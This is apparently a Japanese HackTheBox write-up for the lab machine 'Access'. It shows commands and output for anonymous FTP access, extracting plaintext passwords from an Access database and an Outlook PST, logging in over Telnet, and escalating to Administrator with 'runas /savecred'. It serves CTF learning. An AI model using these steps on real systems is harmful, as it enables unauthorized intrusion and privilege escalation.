+++
title = "HackTheBox - Access Writeup"
date = "2026-04-26"
description = "FTP匿名ログイン・メール解析・保存済み資格情報を利用したWindows権限昇格"
tags = ["HackTheBox", "CTF", "Windows", "FTP", "Telnet", "runas", "savecred", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Access |
| OS | Windows |
| Difficulty | Easy |
| IP | 10.129.24.160 |
| Key Techniques | FTP Anonymous Login, mdbtools, readpst, runas /savecred |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.24.160
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
23/tcp open  telnet  Microsoft Windows XP telnetd
80/tcp open  http    Microsoft IIS httpd 7.5
```

開いているポートは3つ。

| Port | Service | 注目点 |
|------|---------|--------|
| 21 | FTP | 匿名ログイン可能か確認 |
| 23 | Telnet | 認証情報が取れれば侵入可能 |
| 80 | HTTP | IIS 7.5 |

---

## Initial Access — FTP Anonymous Login

FTP に匿名ログインを試みる。

```bash
ftp 10.129.24.160
```

```text
Name: anonymous
Password: (空Enter)
230 User logged in.
```

匿名ログイン成功。ディレクトリを確認する。

```text
ftp> ls
08-23-18  09:16PM    <DIR>    Backups
08-24-18  10:00PM    <DIR>    Engineer
```

---

## File Retrieval

binary モードに切り替えてからファイルを取得する（ASCII モードだとバイナリファイルが破損する）。

```bash
ftp> binary
ftp> cd Backups
ftp> get backup.mdb
ftp> cd ../Engineer
ftp> get "Access Control.zip"
ftp> quit
```

取得したファイル：

| ファイル | サイズ | 内容 |
|---------|--------|------|
| `backup.mdb` | 5.5 MB | Microsoft Access データベース |
| `Access Control.zip` | 10 KB | パスワード付き ZIP |

---

## Credential Extraction — backup.mdb

`mdbtools` を使って Access データベースを解析する。

```bash
# テーブル一覧確認
mdb-tables backup.mdb

# 認証情報テーブルを抽出
mdb-export backup.mdb auth_user
```

```text
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

**`engineer` のパスワード `access4u@security` を発見。**

---

## ZIP Extraction — Access Control.zip

先ほど取得したパスワードで ZIP を解凍する。

```bash
unzip "Access Control.zip"
# Password: access4u@security
```

`Access Control.pst`（Outlook メールアーカイブ）が展開される。

---

## Email Analysis — Access Control.pst

`readpst` で PST ファイルをメール形式に変換する。

```bash
readpst "Access Control.pst"
cat "Access Control.mbox"
```

```text
From: john@megacorp.com
To: security@accesscontrolsystems.com
Subject: MegaCorp Access Control System "security" account

Hi there,

The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.
Please ensure this is passed on to your engineers.

Regards,
John
```

**Telnet 用の認証情報を取得。**

| Username | Password |
|----------|----------|
| security | 4Cc3ssC0ntr0ller |

---

## Foothold — Telnet Login

```bash
telnet 10.129.24.160
```

```text
login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

ログイン成功。Windows シェルを取得。

---

## Flags

### User Flag

```cmd
C:\Users\security\Desktop> type user.txt
```

---

## Privilege Escalation — runas /savecred

### 保存済み資格情報の確認

```cmd
cmdkey /list
```

```text
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

**Administrator の資格情報が Windows に保存されている。**  
`runas /savecred` を使えば、パスワード入力なしに Administrator として任意コマンドを実行できる。

### root.txt の取得

```cmd
runas /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"

type C:\Users\security\Desktop\root.txt
```

### Root Flag

```cmd
C:\Users\security\Desktop> type root.txt
```

---

## Summary

```
FTP 匿名ログイン
    └─ backup.mdb 取得
         └─ mdb-export → ZIP パスワード発見 (access4u@security)
              └─ Access Control.zip 解凍 → .pst 取得
                   └─ readpst → メール解析 → Telnet 資格情報発見
                        └─ Telnet ログイン (security) → user.txt
                             └─ cmdkey /list → 保存済み Administrator 資格情報
                                  └─ runas /savecred → root.txt
```

### 攻略ポイント

| ステップ | 技術 | ポイント |
|---------|------|---------|
| 情報収集 | FTP 匿名ログイン | パスワード不要で重要ファイルを取得 |
| DB解析 | mdbtools | .mdb ファイルから平文パスワードを抽出 |
| メール解析 | readpst | PST からTelnet資格情報を発見 |
| 侵入 | Telnet | 古いプロトコルで平文通信 |
| 権限昇格 | runas /savecred | Windows の正規機能を悪用 |



